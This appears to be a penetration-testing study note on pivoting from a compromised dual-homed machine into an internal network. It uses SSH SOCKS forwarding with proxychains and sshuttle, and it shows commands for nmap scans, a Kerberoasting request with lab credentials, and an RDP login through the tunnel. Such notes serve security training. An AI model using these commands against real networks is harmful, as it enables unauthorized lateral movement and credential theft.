- Imagine if we gain access to a **machine with 2 network interfaces**.
- These interfaces, share **a network which was not available to us** previously.
- We need to ==**access the other previously unaccessible network**==.

# Machine Details
---
- **Access to the `box1` machine** is present with following interfaces:
- ==**.10.5 network is not accessible** :==

# Using proxychains
---
- `cat /etc/proxychains4.conf`
	- We need to **bind to `9050`** port:
	 ![[Pasted image 20250401145849.png]]
- `ssh -f -N -D 9050 -i id_rsa root@10.10.155.5`
	- `-f`: background ssh
	- `-N`: we don't want to execute remote commands, just for port forwarding
	- `-D`: port to bind
	- ![[Pasted image 20250401150121.png]]
- **Running commands through proxychains:**
---
   - `proxychains nmap -p 2049 10.10.10.255` (skip -p for top 1000 ports)
   - `proxychains nmap 10.10.10.255 -sT` (if prev doesn't work)
   - `proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.255 -request`
   - `proxychains xfreerdp3 /v:[10.0.1.9](10.10.10.255)  /u:fcastle /p:myPassword01`
   - `proxychains firefox` => **==Firefox through proxychains => Accessing we services of other interface network==**


# Using sshuttle
---
- `sudo pip install sshuttle`
- `sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"`
	- First address -> our accessible network address
	- Second address -> network to connect with on previous network
	- `ssh-cmd` -> command to run
- Now as long as this window is open, **==we can run commands directly==** like:
	- `nmap 10.10.10.255 -p88`
